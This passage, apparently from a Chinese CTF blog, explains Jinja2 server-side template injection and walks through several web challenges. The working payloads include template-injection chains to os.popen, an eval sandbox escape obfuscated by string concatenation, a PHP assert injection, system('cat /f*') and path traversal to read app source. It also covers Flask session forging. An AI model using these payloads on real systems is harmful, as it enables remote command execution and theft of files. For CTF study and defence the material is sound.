title="详解："></a>详解：</h2><p>SSTI漏洞原理<br>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p><p>这么说可能有点抽象，我们看一下下面的python中的基于jinja2的模板渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/myan&quot;</span></span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h3&gt; Hello %s&#x27;&#x27;&#x27;</span>%name</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>运行后访问<a href="http://127.0.0.1:5000/myan可以发现默认的模板解析参数为guest">http://127.0.0.1:5000/myan可以发现默认的模板解析参数为guest</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d466bfa55bc9ea012079b9bf65a75bb9.png" alt="img"></p><p> 从上面的python代码中我们发现服务端的逻辑是接收前端输入的name参数，然后将其返回到后端进行拼接再返回前端进行展示，当我们输入?name=myan时可以发现前端返回结果</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3d9ff35c53bc54aab6e8fc73de499711.png" alt="img"></p><blockquote><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">模板渲染函数</span></span><br><span class="line"><span class="language-xml">这里主要有两种模板渲染函数，render_template_string()与render_template()，其中render_template是用来渲染一个指定文件的。render_template_string()则是用来渲染字符串的。而渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">包裹的内容当做变量解析替换。比如</span><span class="template-variable">&#123;&#123;<span class="name">2</span>*<span class="number">2</span>&#125;&#125;</span><span class="language-xml">会被解析成4。因此才有了现在的模板注入漏洞。往往变量我们使用</span><span class="template-variable">&#123;&#123;<span class="name">恶意代码</span>&#125;&#125;</span><span class="language-xml">。正因为</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="SSTI漏洞攻击方法"><a href="#SSTI漏洞攻击方法" class="headerlink" title="SSTI漏洞攻击方法"></a>SSTI漏洞攻击方法</h2><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p>这里我想先讲讲类之间的继承关系，因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果，这里我们就具体讲讲类的继承关系</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/12b88699f2f17cdb66c96df653330b03.png" alt="img"></p><p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过<strong>class</strong>魔术方法来找到它的当前类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/32629cc50bef871c175ff2cb97ba6987.png" alt="img"></p><p>可以看到它返回了一个当前的类为C，我们还可以通过<strong>base</strong>这个魔术方法来找到当前类的父类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2fbe9f85aa0cf607d5d5fcc88271531a.png" alt="img"></p><p>可以看到找到了C类的父类B类，如果还想要找B类的父类可以接着使用<strong>base</strong>魔术方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8c05f226639630b4d4ad107563d1c0c3.png" alt="img"></p><p>是没有类了，但是其实所有的类都时object类的子类，当我们创建一个类而没有显式地指定它继承的父类时，这个类就会默认继承object类，因此我们在添加一个<strong>base</strong>就能拿到object</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7d5077f18454f36e57b3f115a9bd759d.png" alt="img"></p><p> 当然这样一个一个递进上去的方法有一些麻烦，所以我们可以使用<strong>mro</strong>魔术方法来一步到位看到类的所有父类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46eef7a33066770af3e60cfaac0058f7.png" alt="img"></p><p>由于它是以数组形式的所以我们在后面加上下标就能拿到指定的类了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d5a6a4672f9a1ccbfd8243b789e792ad.png" alt="img"></p><p>或许你看到这里可能感觉没什么用的样子，但是我希望能把这里理解的透彻一些，这样对于后面理解攻击payload会很有帮助 </p><p>我们在拿到object类后就可以通过object类来查找python中的所有object类的子类，当然这其中会有我们能通过该类rce的子类。我们通过<strong>subclasses</strong>来获取当前类的所有子类<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/24edbadb9ad62466cff298486ae13f07.png" alt="img"></p><p>可以发现有很多类，前面我们也说到了python的所有类最终都是继承object类的，因此这里存在大量的类，当然我们最终的目的是要去进行rce，因此我们应该寻找与之相关的类，这里就给出一个类<class 'os._wrap_close'>，我们在这里找一下，一般大概在第139个，不过具体的环境还是要具体分析，比如我这里就是138<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/32322115743a0c2c9e1bd8bb1030689c.png" alt="img"></p><p>跟前面的<strong>mro</strong>魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a1580dabda5d7e8c5650908f99c21b90.png" alt="img"></p><p>初始化方法后可以通过<strong>globals</strong>魔术方法来返回当前类方法中的全局变量字典，可能有一点点抽象，我也不太懂具体是返回什么，但是大致就是返回当前类的全局变量</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a57a84281c102d35a1952386499a3bd4.png" alt="img"></p><p>可以发现很多全局变量都在里面，我们需要最后能够进行rce，因此应该找到能执行系统命令的方法，这里用popen函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1349cff6c89f458812eff436f68c7b41.png" alt="img"></p><p> 我们执行一下shell命令，这里执行一下whoami，这里一定要记得用.read()来读取一下，因为popen方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出】。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c13d7c7df91b9d0be15f9e52b194454.png" alt="img"></p><p>可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p> 上面用的魔术方法这里总结一下，其他更多的魔术方法之后在补充一下</p><p><strong>class</strong>   ：返回类型所属的对象<br><strong>mro</strong>     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><strong>base</strong>   ：返回该对象所继承的父类<br><strong>mro</strong>     ：返回该对象的所有父类</p><p><strong>subclasses</strong>()  获取当前类的所有子类<br><strong>init</strong>  类的初始化方法<br><strong>globals</strong>  对包含(保存)函数全局变量的字典的引用</p><p>我们可以直接使用下面这些来直接获取对应的类</p><blockquote><p>‘’.<strong>class</strong></p><p>().<strong>class</strong></p><p>[].<strong>class</strong></p><p>“”.<strong>class</strong></p><p>{}.<strong>class</strong></p></blockquote><p>长度限制绕过：</p><p>1.使用较短的注入：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__.os.popen</span>(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">*</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.__globals__.os.popen</span>(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>2.使用全局变量：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.update(a=config.update)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(f=lipsum.__globals__)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(o=config.f.os)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(p=config.o.popen)%&#125;</span><br><span class="line">&#123;&#123;config.p(<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.8.6</title>
      <link href="/posts/fc812fba.html"/>
      <url>/posts/fc812fba.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h2><p>考点：抓包，eval()函数利用，漏洞利用</p><p>打开发现是个计算器。一般碰到计算器就很容易和命令执行扯到一块。<br>随便计算下然后抓个包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806180720171.png" alt="image-20240806180720171"></p><p>发现是get方法，改参数让它报错。发现eval()函数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806180956097.png" alt="image-20240806180956097"></p><p>python语言，用危险函数<code>eval()</code>进行运算。这里我们使用沙箱逃逸，执行命令反弹shell。</p><p>payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_calculate?number1=&amp;<span class="keyword">operator</span>=&amp;number2=__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /f*&#x27;</span>).<span class="keyword">read</span>()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806181354332.png" alt="image-20240806181354332"></p><h2 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h2><p>考点：python库，拼接绕过，漏洞利用</p><p>打开，查看源码。</p><p>code是输入框提交的内容，下面这段代码是将code中由字母、数字、下划线组成的字符串取出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern=re.<span class="built_in">compile</span>(<span class="string">r&#x27;\w+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):</span><br></pre></td></tr></table></figure><p>如果取出的不是数字就判断是否为gmpy2库(高精度算术运算库)的函数名，如果最后都是就eval(code)代码执行</p><p>那么我们可以看一下gmpy2库的函数有什么是可以利用的</p><p>先在本地安装gmpy2库，pip install gmpy2</p><p>查看所有函数名，结果有很多，不过没有可以直接利用的</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">gmpy2</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="title">dir</span>(<span class="variable">gmpy2</span>))</span></span><br></pre></td></tr></table></figure><p>里面有gmpy2和<strong>builtins</strong>，看看gmpy2.<strong>builtins</strong>支持哪些函数，发现有eval</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806184033715.png" alt="image-20240806184033715"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806184054698.png" alt="image-20240806184054698"></p><p>那么我们就可以通过对gmpy2库中的函数名中的字母进行拼接，来等效</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2<span class="selector-class">.__builtins__</span><span class="selector-attr">[<span class="string">&#x27;eval&#x27;</span>]</span>(&quot;os.popen(&#x27;cat /flag&#x27;)<span class="selector-class">.read</span>()&quot;)</span><br></pre></td></tr></table></figure><p>这里可以直接用os是因为import os了，如果没有可以用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2<span class="selector-class">.__builtins__</span><span class="selector-attr">[<span class="string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="selector-class">.read</span>()&quot;)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.<span class="symbol">__builtins__</span>[<span class="string">&#x27;erf&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;div&#x27;</span>[<span class="number">2</span>]+<span class="string">&#x27;ai&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;lcm&#x27;</span>[<span class="number">0</span>]](<span class="string">&#x27;cos&#x27;</span>[<span class="number">1</span>]+<span class="string">&#x27;cos&#x27;</span>[<span class="number">2</span>]+<span class="string">&quot;.&quot;</span>+<span class="string">&#x27;cmp&#x27;</span>[<span class="number">2</span>]+<span class="string">&#x27;cos&#x27;</span>[<span class="number">1</span>]+<span class="string">&#x27;cmp&#x27;</span>[<span class="number">2</span>]+<span class="string">&#x27;erf&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;jn&#x27;</span>[<span class="number">1</span>]+<span class="string">&quot;(&quot;</span>+<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&#x27;cmp&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;ai&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;cot&#x27;</span>[<span class="number">2</span>]+<span class="string">&quot; &quot;</span>+<span class="string">&quot;/&quot;</span>+<span class="string">&#x27;erf&#x27;</span>[<span class="number">2</span>]+<span class="string">&#x27;lcm&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;ai&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;agm&#x27;</span>[<span class="number">1</span>]+<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>+<span class="string">&#x27;erf&#x27;</span>[<span class="number">1</span>]+<span class="string">&#x27;erf&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;ai&#x27;</span>[<span class="number">0</span>]+<span class="string">&#x27;add&#x27;</span>[<span class="number">1</span>]+<span class="string">&quot;(&quot;</span>+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.29</title>
      <link href="/posts/9a40696a.html"/>
      <url>/posts/9a40696a.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><p>考点：代码审计，url编码</p><p>打开网站，分析代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729172402714.png" alt="image-20240729172402714"></p><p>其中就是把“大牛”二字用url编码后，分别传参就行。</p><h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>考点：控制台运行</p><p>打开链接，是一个贪吃蛇游戏，根据提示，要得到2077分才能出现flag。</p><p>调试器查看文件，发现本地变量是Game。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729175716678.png" alt="image-20240729175716678"></p><p>在控制台输入Game，查看发现其中有个score变量，应该是存储分数的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729175844065.png" alt="image-20240729175844065"></p><p>输入Game.score=2077，然后开始游戏得一分即可出现flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729175959031.png" alt="image-20240729175959031"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask中的session伪造</title>
      <link href="/posts/320a5814.html"/>
      <url>/posts/320a5814.html</url>
      
        <content type="html"><![CDATA[<p>flask中的session伪造<br>使用 密钥SECRET_KEY 和 经过解码原session篡改后的字典 可以重新加密生成一个session。<br>有一个开源脚本可以帮我们自动生成：<a href="https://github.com/noraj/flask-session-cookie-manager（kali机上已下载）">https://github.com/noraj/flask-session-cookie-manager（kali机上已下载）</a></p><p>现在流行两种方式登录认证方式：Session和JWT，无论是哪种方式其原理都是保存凭证：<br>1.前端发起登录认证请求<br>2.后端登录验证通过，返回给前端一个凭证<br>3.前端发起新的请求时携带凭证<br>只不过session的重点是会在服务端存储凭证；而JWT不会在服务端存储凭证，而是会将返回的凭证根据签名和加密方式来校验其是否被篡改。</p><p>session安全问题：<br>flask框架的session是存储在客户端的，那么就需要解决session是否会被恶意纂改的问题，而flask通过一个secret_key，也就是密钥对数据进行签名来<br>防止session被纂改，在我上面写的例子就定义有密钥（app.config[‘SECRET_KEY’] = ‘tanji_is_A_boy_Yooooooooooooooooooooo!’）</p><p>flask session 伪造：<br>一、session的作用<br>由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要<br>求必须实现有状态，而session机制实现的就是这个功能。用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它<br>保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，<br>解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息</p><p>二、flask session的储存方式<br>第一种方式：直接存在客户端的cookies中</p><p>第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</p><p>flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</p><p>三、flask的session格式<br>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p><p>eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0<br>                            session数据                                          时间戳                       签名<br>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用Hmac算法，将session数据和时间戳加上secret_key加密而成的，用来保证数据没有被修改。</p><p>四、flask session伪造<br>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们<br>得到secret_key我们就可以很轻松的进行session伪造。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.26</title>
      <link href="/posts/aff74fb.html"/>
      <url>/posts/aff74fb.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一言既出（笔记KEY：intval绕过）"><a href="#一言既出（笔记KEY：intval绕过）" class="headerlink" title="一言既出（笔记KEY：intval绕过）"></a>一言既出（笔记KEY：intval绕过）</h2><p>考点：弱类型比较，intval()函数，注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析代码，传入num，要使num的值等于114514，经过intval()函数后要等于1919810。因此有两种思路：</p><p>1.让num的值同时满足这两个条件。比如可以构造num=114514+1919810-114514，传入时进行url编码。</p><p>由于是弱类型比较，提取开头数字就等于114514，满足条件1，而经过intval()函数处理，最后就是intval(1919810)==1919810，而不会执行die()；</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726142255179.png" alt="image-20240726142255179"></p><p>2.让intval()函数后面的直接不执行（注释掉）。传入num=114514);//。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726142935055.png" alt="image-20240726142935055"></p><p>语句在执行的过程中变为：</p><p>assert(“intval(114514);//)==1919810”) or die(“一言既出，驷马难追!”);</p><p>部分被注释，不在运行，此时执行 echo $flag;</p><h2 id="webshell（经验：空白页面查看页面源代码）"><a href="#webshell（经验：空白页面查看页面源代码）" class="headerlink" title="webshell（经验：空白页面查看页面源代码）"></a>webshell（经验：空白页面查看页面源代码）</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726155020343.png" alt="image-20240726155020343"></p><p>分析，大致就是执行cmd语句，但会对cmd语句进行反序列化，使用传入的cmd要进行序列化</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726155216131.png" alt="image-20240726155216131"></p><p>发现flag.php，再次修改，因为过滤了flag字母，使用tac f*打开。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726153456861.png" alt="image-20240726153456861"></p><p>找到flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726155419560.png" alt="image-20240726155419560"></p><p>批注：使用cat f*也可以，但是回显是空白，需要查看页面源代码。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.25</title>
      <link href="/posts/93f62541.html"/>
      <url>/posts/93f62541.html</url>
      
        <content type="html"><![CDATA[<h2 id="我吐了你随意"><a href="#我吐了你随意" class="headerlink" title="我吐了你随意"></a>我吐了你随意</h2><p>0宽隐写，使用在线工具，将文本复制进去直接得到flag</p><h2 id="迅疾响应"><a href="#迅疾响应" class="headerlink" title="迅疾响应"></a>迅疾响应</h2><p>二维码，先用toolfxs里的工具，发现扫不出来，然后用qrazybox在线工具解出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112855565.png" alt="image-20240725112855565"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112922997.png" alt="image-20240725112922997"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112946131.png" alt="image-20240725112946131"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113009662.png" alt="image-20240725113009662"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113030144.png" alt="image-20240725113030144"></p><h2 id="打不开的图片"><a href="#打不开的图片" class="headerlink" title="打不开的图片"></a>打不开的图片</h2><p>图片损坏，扔进010editor看看。发现png格式前缀不对，用工具里的求反，然后保存，图片就恢复正常了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.25</title>
      <link href="/posts/93f62541.html"/>
      <url>/posts/93f62541.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>考点：代码审计，http请求</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725125048233.png" alt="image-20240725125048233"></p><p>先传Cookie,即</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTFshow-QQ<span class="built_in">%E</span>7<span class="built_in">%BE</span><span class="built_in">%A</span>4:=a </span><br></pre></td></tr></table></figure><p>​       (中文要进行url编码)</p><p>接下来传post[‘a’]，即a=b</p><p>然后传get[‘b’]，即?b=c</p><p>最后的request，传GET或者POST方法都可以，即</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;c[<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]=system(<span class="string">&#x27;cat /f*&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725125819297.png" alt="image-20240725125819297"></p><h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p>考点：查看源代码，使用控制台</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725133817711.png" alt="image-20240725133817711"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725133847780.png" alt="image-20240725133847780"></p><h2 id="我的眼里只有￥"><a href="#我的眼里只有￥" class="headerlink" title="我的眼里只有￥"></a>我的眼里只有￥</h2><p>考点：代码审计，脚本利用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725192622896.png" alt="image-20240725192622896"></p><p><em>=a,即$_</em>=a,后面就是$a，$a=b,就变成$b，以此类推，用python脚本连续传参可解。</p><h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p>考点：查看源代码，代码审计，flask中的session构造</p><p>打开链接，发现可以下载“老婆“。查看代码，发现一串下载的可以代码。（/download?file=a）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220105916.png" alt="image-20240725220105916"></p><p>用GET方法下载一个文件，发现不成功，页面跳转。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220228045.png" alt="image-20240725220228045"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220311186.png" alt="image-20240725220311186"></p><p>发现”flag“，怀疑/app/app.py文件。下载此文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220413846.png" alt="image-20240725220413846"></p><p>报错，仔细分析，发现可以用../退级，改为 ../../app.py，成功下载。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span 